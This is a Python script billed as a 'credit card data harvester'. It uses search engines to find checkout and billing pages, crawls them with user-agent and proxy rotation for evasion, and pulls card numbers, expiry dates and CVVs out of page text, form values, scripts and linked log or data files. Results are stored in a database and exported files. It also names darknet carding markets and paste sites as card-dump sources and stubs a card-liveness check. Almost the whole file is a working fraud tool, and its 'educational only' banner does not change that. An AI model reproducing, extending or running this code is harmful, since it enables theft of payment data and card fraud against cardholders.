#!/usr/bin/env python3
"""
WEBSCRAPER PRO v3.0 - Advanced Credit Card Data Harvester
Author: BlackHatLisa
Features: Multi-threaded scraping, intelligent pattern matching, CC validation, evasion
"""

import os
import re
import json
import time
import random
import threading
import queue
import sqlite3
from datetime import datetime
from colorama import Fore, Style, init
import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin, urlencode
import hashlib
import argparse
import csv
import pandas as pd
from fake_useragent import UserAgent
import socket
import ssl
import dns.resolver

# Initialize colorama
init(autoreset=True)

# Configuration
class Config:
    MAX_THREADS = 50
    MAX_DEPTH = 3
    REQUEST_DELAY = 1  # seconds between requests
    TIMEOUT = 10
    USER_AGENT_ROTATION = True
    
    # Credit card patterns (Luhn algorithm valid ranges)
    CARD_PATTERNS = {
        'Visa': r'4[0-9]{12}(?:[0-9]{3})?',
        'MasterCard': r'5[1-5][0-9]{14}',
        'American Express': r'3[47][0-9]{13}',
        'Discover': r'6(?:011|5[0-9]{2})[0-9]{12}',
        'Diners Club': r'3(?:0[0-5]|[68][0-9])[0-9]{11}',
        'JCB': r'(?:2131|1800|35\d{3})\d{11}',
        'UnionPay': r'62[0-9]{14,17}'
    }
    
    # Additional patterns for card data
    EXPIRY_PATTERNS = [
        r'(0[1-9]|1[0-2])\/?([0-9]{2}|[0-9]{4})',
        r'([0-9]{2})\/([0-9]{2})',
        r'Exp\.?\s*([0-9]{2})\/([0-9]{2,4})',
        r'Expiry\s*:\s*([0-9]{2})\/([0-9]{2})'
    ]
    
    CVV_PATTERNS = [
        r'CVV2?\s*[:=\-]?\s*([0-9]{3,4})',
        r'CVC2?\s*[:=\-]?\s*([0-9]{3,4})',
        r'Security\s*Code\s*[:=\-]?\s*([0-9]{3,4})',
        r'([0-9]{3,4})\s*\(?(?:CVV|CVC|Security Code)\)?'
    ]
    
    # Target categories (sites likely to have CC data)
    TARGET_CATEGORIES = [
        'ecommerce', 'shopping', 'payment', 'checkout',
        'billing', 'invoice', 'account', 'profile',
        'admin', 'dashboard', 'user', 'member'
    ]
    
    # Search engines to find targets
    SEARCH_ENGINES = {
        'google': 'https://www.google.com/search?q=',
        'bing': 'https://www.bing.com/search?q=',
        'duckduckgo': 'https://duckduckgo.com/html/?q='
    }
    
    # Proxies for rotation (add your own)
    PROXY_LIST = []
    
    # Output directory
    OUTPUT_DIR = 'scraped_data'
    DATABASE_FILE = 'cards.db'

class CreditCardValidator:
    """Validate and process credit card numbers"""
    
    @staticmethod
    def luhn_check(card_number):
        """Luhn algorithm validation"""
        def digits_of(n):
            return [int(d) for d in str(n)]
        digits = digits_of(card_number)
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]
        checksum = sum(odd_digits)
        for d in even_digits:
            checksum += sum(digits_of(d * 2))
        return checksum % 10 == 0
    
    @staticmethod
    def get_card_type(card_number):
        """Determine card type from number"""
        card_str = str(card_number)
        
        # Remove non-digits
        card_str = re.sub(r'\D', '', card_str)
        
        for card_type, pattern in Config.CARD_PATTERNS.items():
            if re.fullmatch(pattern, card_str):
                return card_type
        return "Unknown"
    
    @staticmethod
    def extract_card_data(text):
        """Extract all card-related data from text"""
        results = {
            'cards': [],
            'expiries': [],
            'cvvs': [],
            'full_records': []
        }
        
        # Extract card numbers
        for card_type, pattern in Config.CARD_PATTERNS.items():
            matches = re.finditer(pattern, text)
            for match in matches:
                card_number = match.group()
                if CreditCardValidator.luhn_check(card_number):
                    results['cards'].append({
                        'number': card_number,
                        'type': card_type,
                        'position': match.start()
                    })
        
        # Extract expiry dates
        for pattern in Config.EXPIRY_PATTERNS:
            matches = re.finditer(pattern, text, re.IGNORECASE)
            for match in matches:
                results['expiries'].append({
                    'date': match.group(),
                    'position': match.start()
                })
        
        # Extract CVVs
        for pattern in Config.CVV_PATTERNS:
            matches = re.finditer(pattern, text, re.IGNORECASE)
            for match in matches:
                results['cvvs'].append({
                    'cvv': match.group(1),
                    'position': match.start()
                })
        
        # Try to match cards with expiries and CVVs
        for card in results['cards']:
            card_pos = card['position']
            
            # Find closest expiry (within 100 chars)
            closest_expiry = None
            min_distance = 100
            for expiry in results['expiries']:
                distance = abs(expiry['position'] - card_pos)
                if distance < min_distance and distance < 100:
                    min_distance = distance
                    closest_expiry = expiry['date']
            
            # Find closest CVV
            closest_cvv = None
            min_distance = 100
            for cvv in results['cvvs']:
                distance = abs(cvv['position'] - card_pos)
                if distance < min_distance and distance < 100:
                    min_distance = distance
                    closest_cvv = cvv['cvv']
            
            # Create full record if we have extra data
            if closest_expiry or closest_cvv:
                record = {
                    'card_number': card['number'],
                    'card_type': card['type'],
                    'expiry': closest_expiry,
                    'cvv': closest_cvv,
                    'timestamp': datetime.now().isoformat()
                }
                results['full_records'].append(record)
        
        return results

class WebScraper:
    """Advanced web scraper with evasion techniques"""
    
    def __init__(self):
        self.session = requests.Session()
        self.ua = UserAgent()
        self.visited_urls = set()
        self.found_cards = []
        self.card_validator = CreditCardValidator()
        self.url_queue = queue.Queue()
        self.lock = threading.Lock()
        self.scraped_count = 0
        
        # Create output directory
        os.makedirs(Config.OUTPUT_DIR, exist_ok=True)
        
        # Initialize database
        self.init_database()
    
    def init_database(self):
        """Initialize SQLite database"""
        self.db = sqlite3.connect(os.path.join(Config.OUTPUT_DIR, Config.DATABASE_FILE))
        cursor = self.db.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS credit_cards (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                card_number TEXT UNIQUE,
                card_type TEXT,
                expiry TEXT,
                cvv TEXT,
                source_url TEXT,
                timestamp TEXT,
                validated INTEGER DEFAULT 0
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS scraped_urls (
                url TEXT PRIMARY KEY,
                timestamp TEXT,
                cards_found INTEGER
            )
        ''')
        
        self.db.commit()
    
    def save_to_database(self, card_data, source_url):
        """Save found card to database"""
        try:
            cursor = self.db.cursor()
            
            # Check if card already exists
            cursor.execute('SELECT id FROM credit_cards WHERE card_number = ?', 
                         (card_data['card_number'],))
            if cursor.fetchone():
                return False
            
            # Insert new card
            cursor.execute('''
                INSERT INTO credit_cards 
                (card_number, card_type, expiry, cvv, source_url, timestamp)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (
                card_data['card_number'],
                card_data['card_type'],
                card_data.get('expiry'),
                card_data.get('cvv'),
                source_url,
                card_data['timestamp']
            ))
            
            # Update scraped URLs
            cursor.execute('''
                INSERT OR REPLACE INTO scraped_urls (url, timestamp, cards_found)
                VALUES (?, ?, COALESCE((SELECT cards_found FROM scraped_urls WHERE url = ?), 0) + 1)
            ''', (source_url, datetime.now().isoformat(), source_url))
            
            self.db.commit()
            
            with self.lock:
                self.found_cards.append(card_data)
            
            return True
            
        except Exception as e:
            print(Fore.RED + f"[-] Database error: {e}")
            return False
    
    def save_to_file(self, card_data, source_url):
        """Save card to JSON and CSV files"""
        # JSON file
        json_file = os.path.join(Config.OUTPUT_DIR, 'cards.json')
        
        data = {
            'card_number': card_data['card_number'],
            'card_type': card_data['card_type'],
            'expiry': card_data.get('expiry'),
            'cvv': card_data.get('cvv'),
            'source_url': source_url,
            'timestamp': card_data['timestamp']
        }
        
        # Append to JSON
        try:
            existing_data = []
            if os.path.exists(json_file):
                with open(json_file, 'r') as f:
                    existing_data = json.load(f)
            
            existing_data.append(data)
            
            with open(json_file, 'w') as f:
                json.dump(existing_data, f, indent=2)
        except:
            with open(json_file, 'w') as f:
                json.dump([data], f, indent=2)
        
        # CSV file
        csv_file = os.path.join(Config.OUTPUT_DIR, 'cards.csv')
        
        file_exists = os.path.exists(csv_file)
        
        with open(csv_file, 'a', newline='') as f:
            writer = csv.DictWriter(f, fieldnames=data.keys())
            if not file_exists:
                writer.writeheader()
            writer.writerow(data)
    
    def rotate_user_agent(self):
        """Rotate User-Agent header"""
        if Config.USER_AGENT_ROTATION:
            self.session.headers.update({
                'User-Agent': self.ua.random,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'DNT': '1',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            })
    
    def get_proxy(self):
        """Get random proxy from list"""
        if Config.PROXY_LIST:
            return {'http': random.choice(Config.PROXY_LIST),
                   'https': random.choice(Config.PROXY_LIST)}
        return None
    
    def scrape_url(self, url, depth=0):
        """Scrape a single URL for credit card data"""
        if depth > Config.MAX_DEPTH:
            return
        
        if url in self.visited_urls:
            return
        
        self.visited_urls.add(url)
        
        try:
            # Add delay to avoid rate limiting
            time.sleep(random.uniform(Config.REQUEST_DELAY, Config.REQUEST_DELAY * 2))
            
            # Rotate user agent
            self.rotate_user_agent()
            
            # Get proxy
            proxies = self.get_proxy()
            
            print(Fore.YELLOW + f"[*] Scraping: {url} (Depth: {depth})")
            
            # Fetch page
            response = self.session.get(
                url,
                timeout=Config.TIMEOUT,
                proxies=proxies,
                verify=False  # Warning: Disables SSL verification
            )
            
            if response.status_code != 200:
                print(Fore.RED + f"[-] Failed: {url} - Status {response.status_code}")
                return
            
            # Parse HTML
            soup = BeautifulSoup(response.content, 'html.parser')
            
            # Get all text content
            text_content = soup.get_text()
            
            # Also check specific elements that might contain card data
            suspicious_elements = []
            
            # Check input fields (might have card data in values)
            for input_tag in soup.find_all(['input', 'textarea']):
                if input_tag.get('value'):
                    suspicious_elements.append(input_tag.get('value'))
            
            # Check script tags (sometimes cards in JavaScript)
            for script in soup.find_all('script'):
                if script.string:
                    suspicious_elements.append(script.string)
            
            # Check meta tags
            for meta in soup.find_all('meta'):
                if meta.get('content'):
                    suspicious_elements.append(meta.get('content'))
            
            # Combine all text for analysis
            all_text = text_content + ' ' + ' '.join(suspicious_elements)
            
            # Extract card data
            card_results = self.card_validator.extract_card_data(all_text)
            
            # Process found cards
            for card_record in card_results['full_records']:
                print(Fore.GREEN + f"[+] Found: {card_record['card_type']} - {card_record['card_number']}")
                
                # Save to database
                self.save_to_database(card_record, url)
                
                # Save to files
                self.save_to_file(card_record, url)
                
                # Print details
                details = []
                if card_record.get('expiry'):
                    details.append(f"Exp: {card_record['expiry']}")
                if card_record.get('cvv'):
                    details.append(f"CVV: {card_record['cvv']}")
                
                if details:
                    print(Fore.CYAN + f"    Details: {' | '.join(details)}")
            
            # Update counter
            with self.lock:
                self.scraped_count += 1
            
            # If we found cards or it's a promising page, scrape deeper
            if card_results['cards'] or self.is_promising_page(soup, url):
                # Extract and queue new URLs
                if depth < Config.MAX_DEPTH:
                    new_urls = self.extract_links(soup, url)
                    for new_url in new_urls:
                        if new_url not in self.visited_urls:
                            self.url_queue.put((new_url, depth + 1))
            
            # Also scrape related files
            self.scrape_files(soup, url)
            
        except Exception as e:
            print(Fore.RED + f"[-] Error scraping {url}: {e}")
    
    def is_promising_page(self, soup, url):
        """Check if page is likely to contain card data"""
        url_lower = url.lower()
        text_lower = soup.get_text().lower()
        
        # Keywords indicating payment/card pages
        payment_keywords = [
            'checkout', 'payment', 'credit card', 'billing',
            'pay now', 'card number', 'expiry', 'cvv',
            'secure payment', 'process payment', 'buy now',
            'add card', 'save card', 'card details'
        ]
        
        # Check URL for keywords
        for keyword in payment_keywords:
            if keyword in url_lower:
                return True
        
        # Check page text
        for keyword in payment_keywords:
            if keyword in text_lower:
                return True
        
        # Check for forms with card fields
        for form in soup.find_all('form'):
            form_text = form.get_text().lower()
            if any(keyword in form_text for keyword in ['card', 'exp', 'cvv', 'security code']):
                return True
        
        # Check for input fields related to cards
        card_field_names = ['cardnumber', 'card_number', 'ccnumber', 'creditcard',
                           'expiry', 'expdate', 'cvv', 'cvc', 'securitycode']
        
        for input_field in soup.find_all('input'):
            input_name = input_field.get('name', '').lower()
            input_id = input_field.get('id', '').lower()
            
            for field_name in card_field_names:
                if field_name in input_name or field_name in input_id:
                    return True
        
        return False
    
    def extract_links(self, soup, base_url):
        """Extract all links from page"""
        links = set()
        
        for a_tag in soup.find_all('a', href=True):
            href = a_tag['href']
            
            # Convert relative URLs to absolute
            absolute_url = urljoin(base_url, href)
            
            # Filter out unwanted URLs
            if self.should_scrape(absolute_url):
                links.add(absolute_url)
        
        return list(links)
    
    def should_scrape(self, url):
        """Determine if URL should be scraped"""
        parsed = urlparse(url)
        
        # Skip non-HTTP URLs
        if parsed.scheme not in ['http', 'https']:
            return False
        
        # Skip common non-content URLs
        skip_extensions = ['.pdf', '.jpg', '.jpeg', '.png', '.gif', '.zip',
                          '.rar', '.exe', '.dmg', '.mp4', '.mp3', '.avi']
        
        if any(url.lower().endswith(ext) for ext in skip_extensions):
            return False
        
        # Skip common non-page paths
        skip_paths = ['/cdn-cgi/', '/wp-admin/', '/admin/', '/api/',
                     '/ajax/', '/json/', '/xml/', '/feed/']
        
        if any(path in parsed.path for path in skip_paths):
            return False
        
        return True
    
    def scrape_files(self, soup, base_url):
        """Scrape linked files that might contain data"""
        file_extensions = ['.txt', '.csv', '.json', '.xml', '.log']
        
        for link in soup.find_all('a', href=True):
            href = link['href']
            
            for ext in file_extensions:
                if href.lower().endswith(ext):
                    file_url = urljoin(base_url, href)
                    
                    try:
                        print(Fore.YELLOW + f"[*] Checking file: {file_url}")
                        
                        response = self.session.get(file_url, timeout=Config.TIMEOUT)
                        
                        if response.status_code == 200:
                            # Extract text from file
                            file_content = response.text
                            
                            # Search for cards
                            card_results = self.card_validator.extract_card_data(file_content)
                            
                            # Process found cards
                            for card_record in card_results['full_records']:
                                print(Fore.GREEN + f"[+] Found in file: {card_record['card_type']} - {card_record['card_number']}")
                                
                                self.save_to_database(card_record, file_url)
                                self.save_to_file(card_record, file_url)
                    
                    except Exception as e:
                        continue
    
    def find_targets_via_search(self, query, num_results=50):
        """Find target URLs via search engines"""
        print(Fore.YELLOW + f"[*] Searching for: {query}")
        
        search_urls = []
        
        for engine_name, engine_url in Config.SEARCH_ENGINES.items():
            try:
                search_query = f"{query} checkout OR payment OR billing OR credit card"
                full_url = engine_url + urlencode({'q': search_query})
                
                headers = {'User-Agent': self.ua.random}
                response = self.session.get(full_url, headers=headers, timeout=Config.TIMEOUT)
                
                soup = BeautifulSoup(response.content, 'html.parser')
                
                # Extract search results (Google-specific)
                for a_tag in soup.find_all('a'):
                    href = a_tag.get('href', '')
                    
                    # Google result links
                    if 'url?q=' in href and 'webcache' not in href:
                        url = href.split('url?q=')[1].split('&')[0]
                        
                        # Decode URL
                        url = requests.utils.unquote(url)
                        
                        if self.should_scrape(url):
                            search_urls.append(url)
                    
                    # Direct links
                    elif href.startswith('http') and 'google' not in href:
                        if self.should_scrape(href):
                            search_urls.append(href)
                
                # Limit results
                search_urls = list(set(search_urls))[:num_results]
                
                print(Fore.GREEN + f"[+] Found {len(search_urls)} URLs from {engine_name}")
                
            except Exception as e:
                print(Fore.RED + f"[-] Search error ({engine_name}): {e}")
        
        return search_urls
    
    def worker(self):
        """Worker thread for concurrent scraping"""
        while True:
            try:
                url, depth = self.url_queue.get(timeout=30)
                self.scrape_url(url, depth)
                self.url_queue.task_done()
                
            except queue.Empty:
                break
            except Exception as e:
                print(Fore.RED + f"[-] Worker error: {e}")
                continue
    
    def start_scraping(self, start_urls=None, search_queries=None):
        """Start the scraping process"""
        print(Fore.CYAN + "="*60)
        print(Fore.CYAN + " " * 20 + "WEBSCRAPER PRO v3.0")
        print(Fore.CYAN + "="*60)
        print(Fore.YELLOW + "[*] Starting credit card data harvesting...")
        
        # Add starting URLs to queue
        if start_urls:
            for url in start_urls:
                self.url_queue.put((url, 0))
        
        # Search for targets if no URLs provided
        if search_queries and self.url_queue.empty():
            for query in search_queries:
                found_urls = self.find_targets_via_search(query)
                for url in found_urls:
                    self.url_queue.put((url, 0))
        
        # If still no URLs, use default search
        if self.url_queue.empty():
            print(Fore.YELLOW + "[*] Using default search queries...")
            default_queries = [
                'payment gateway test',
                'checkout demo',
                'credit card processing',
                'billing system',
                'ecommerce store'
            ]
            
            for query in default_queries:
                found_urls = self.find_targets_via_search(query)
                for url in found_urls:
                    self.url_queue.put((url, 0))
        
        # Start worker threads
        threads = []
        for i in range(min(Config.MAX_THREADS, self.url_queue.qsize())):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            threads.append(t)
            t.start()
            print(Fore.YELLOW + f"[*] Started worker thread {i+1}")
        
        # Wait for queue to be processed
        self.url_queue.join()
        
        # Wait for threads to finish
        for t in threads:
            t.join(timeout=5)
        
        # Print summary
        self.print_summary()
    
    def print_summary(self):
        """Print scraping summary"""
        print(Fore.CYAN + "\n" + "="*60)
        print(Fore.CYAN + " " * 20 + "SCRAPING SUMMARY")
        print(Fore.CYAN + "="*60)
        
        print(Fore.YELLOW + f"[*] URLs Scraped: {self.scraped_count}")
        print(Fore.YELLOW + f"[*] Credit Cards Found: {len(self.found_cards)}")
        
        # Breakdown by card type
        card_types = {}
        for card in self.found_cards:
            card_type = card['card_type']
            card_types[card_type] = card_types.get(card_type, 0) + 1
        
        print(Fore.YELLOW + "\n[*] Card Type Breakdown:")
        for card_type, count in card_types.items():
            print(Fore.WHITE + f"    {card_type}: {count}")
        
        # Database stats
        cursor = self.db.cursor()
        cursor.execute('SELECT COUNT(*) FROM credit_cards')
        db_count = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(DISTINCT source_url) FROM credit_cards')
        url_count = cursor.fetchone()[0]
        
        print(Fore.YELLOW + f"\n[*] Database Stats:")
        print(Fore.WHITE + f"    Total cards in DB: {db_count}")
        print(Fore.WHITE + f"    Unique source URLs: {url_count}")
        
        # Output files
        json_file = os.path.join(Config.OUTPUT_DIR, 'cards.json')
        csv_file = os.path.join(Config.OUTPUT_DIR, 'cards.csv')
        db_file = os.path.join(Config.OUTPUT_DIR, Config.DATABASE_FILE)
        
        print(Fore.YELLOW + f"\n[*] Output Files:")
        for file_path, desc in [(json_file, 'JSON data'), 
                               (csv_file, 'CSV data'), 
                               (db_file, 'SQLite database')]:
            if os.path.exists(file_path):
                size = os.path.getsize(file_path) / 1024  # KB
                print(Fore.WHITE + f"    {desc}: {file_path} ({size:.1f} KB)")
        
        print(Fore.CYAN + "="*60)

class AdvancedFeatures:
    """Additional advanced scraping features"""
    
    @staticmethod
    def scrape_darknet():
        """Scrape darknet markets for card dumps (requires Tor)"""
        tor_proxy = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }
        
        darknet_markets = [
            'http://carder007mrxchnmrnqjweq2j4csw2onejqjsyxw6l3uic2v2u7u5sid.onion',
            'http://cardvila2zavqgnv2qpoajn6oe7c2bjrc5wkjaemduc6y6mcs6r6jid.onion'
        ]
        
        print(Fore.RED + "[!] Darknet scraping requires Tor running on port 9050")
        
        for market in darknet_markets:
            try:
                response = requests.get(market, proxies=tor_proxy, timeout=30)
                # Parse and extract card data
                print(Fore.GREEN + f"[+] Accessed darknet market: {market}")
            except:
                print(Fore.RED + f"[-] Failed to access: {market}")
    
    @staticmethod
    def scrape_paste_sites():
        """Scrape paste sites for card dumps"""
        paste_sites = [
            'https://pastebin.com',
            'https://ghostbin.com',
            'https://rentry.co'
        ]
        
        for site in paste_sites:
            try:
                response = requests.get(site)
                # Look for paste listings
                print(Fore.YELLOW + f"[*] Checking {site}")
            except:
                continue
    
    @staticmethod
    def check_card_balance(card_number, expiry, cvv):
        """Check if card is live (WARNING: This will trigger fraud alerts)"""
        print(Fore.RED + "[!] WARNING: Balance checking may trigger fraud alerts")
        
        # This is just a template - actual implementation would require
        # testing against payment gateways, which is highly illegal
        pass

# ==================== MAIN ====================

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description='WebScraper Pro - Credit Card Data Harvester')
    parser.add_argument('-u', '--urls', nargs='+', help='Starting URLs to scrape')
    parser.add_argument('-s', '--search', nargs='+', help='Search queries to find targets')
    parser.add_argument('-t', '--threads', type=int, default=50, help='Number of threads')
    parser.add_argument('-d', '--depth', type=int, default=3, help='Max crawl depth')
    parser.add_argument('-o', '--output', default='scraped_data', help='Output directory')
    
    args = parser.parse_args()
    
    # Update config from arguments
    Config.MAX_THREADS = args.threads
    Config.MAX_DEPTH = args.depth
    Config.OUTPUT_DIR = args.output
    
    # Create scraper instance
    scraper = WebScraper()
    
    # Start scraping
    scraper.start_scraping(start_urls=args.urls, search_queries=args.search)
    
    # Ask about advanced features
    if scraper.found_cards:
        print(Fore.YELLOW + "\n[*] Advanced options:")
        print(Fore.WHITE + "    1. Validate cards (check if live)")
        print(Fore.WHITE + "    2. Export to various formats")
        print(Fore.WHITE + "    3. Continue scraping with new targets")
        
        choice = input(Fore.GREEN + "\n[?] Select option (1-3 or Enter to exit): ").strip()
        
        if choice == '1':
            print(Fore.RED + "[!] Card validation not implemented (too risky)")
        elif choice == '2':
            # Export to additional formats
            export_data(scraper.found_cards)
        elif choice == '3':
            new_query = input(Fore.YELLOW + "[?] New search query: ").strip()
            if new_query:
                scraper.start_scraping(search_queries=[new_query])

def export_data(cards):
    """Export found cards to various formats"""
    output_dir = Config.OUTPUT_DIR
    
    # Export to Excel
    if cards:
        df = pd.DataFrame(cards)
        excel_file = os.path.join(output_dir, 'cards.xlsx')
        df.to_excel(excel_file, index=False)
        print(Fore.GREEN + f"[+] Exported to Excel: {excel_file}")
        
        # Export to SQL
        sql_file = os.path.join(output_dir, 'cards.sql')
        with open(sql_file, 'w') as f:
            f.write("CREATE TABLE credit_cards (\n")
            f.write("  id INT PRIMARY KEY AUTO_INCREMENT,\n")
            f.write("  card_number VARCHAR(20),\n")
            f.write("  card_type VARCHAR(20),\n")
            f.write("  expiry VARCHAR(10),\n")
            f.write("  cvv VARCHAR(4),\n")
            f.write("  source_url TEXT,\n")
            f.write("  timestamp DATETIME\n);\n\n")
            
            for card in cards:
                values = [
                    card.get('card_number', ''),
                    card.get('card_type', ''),
                    card.get('expiry', ''),
                    card.get('cvv', ''),
                    card.get('source_url', ''),
                    card.get('timestamp', '')
                ]
                values = [f"'{v}'" if v else 'NULL' for v in values]
                f.write(f"INSERT INTO credit_cards VALUES ({', '.join(values)});\n")
        
        print(Fore.GREEN + f"[+] Exported to SQL: {sql_file}")

if __name__ == "__main__":
    # Banner
    print(Fore.RED + r"""
    ╔══════════════════════════════════════════════════════════╗
    ║      ██╗    ██╗███████╗██████╗ ███████╗ ██████╗         ║
    ║      ██║    ██║██╔════╝██╔══██╗██╔════╝██╔════╝         ║
    ║      ██║ █╗ ██║█████╗  ██████╔╝███████╗██║              ║
    ║      ██║███╗██║██╔══╝  ██╔══██╗╚════██║██║              ║
    ║      ╚███╔███╔╝███████╗██████╔╝███████║╚██████╗         ║
    ║       ╚══╝╚══╝ ╚══════╝╚═════╝ ╚══════╝ ╚═════╝         ║
    ║      ██████╗██████╗ ██████╗ ███████╗███████╗██████╗     ║
    ║     ██╔════╝██╔══██╗██╔══██╗██╔════╝██╔════╝██╔══██╗    ║
    ║     ██║     ██████╔╝██████╔╝███████╗█████╗  ██████╔╝    ║
    ║     ██║     ██╔══██╗██╔══██╗╚════██║██╔══╝  ██╔══██╗    ║
    ║     ╚██████╗██║  ██║██║  ██║███████║███████╗██║  ██║    ║
    ║      ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝    ║
    ║                   v3.0 - DATA HARVESTER                  ║
    ╚══════════════════════════════════════════════════════════╝
    """)
    
    print(Fore.YELLOW + "[" + Fore.RED + "!" + Fore.YELLOW + "] " + Fore.RED + "FOR EDUCATIONAL & AUTHORIZED TESTING ONLY")
    print(Fore.YELLOW + "[" + Fore.RED + "!" + Fore.YELLOW + "] " + Fore.RED + "Scraping credit card data without permission is ILLEGAL\n")
    
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[*] Interrupted by user")
    except Exception as e:
        print(Fore.RED + f"\n[-] Fatal error: {e}")
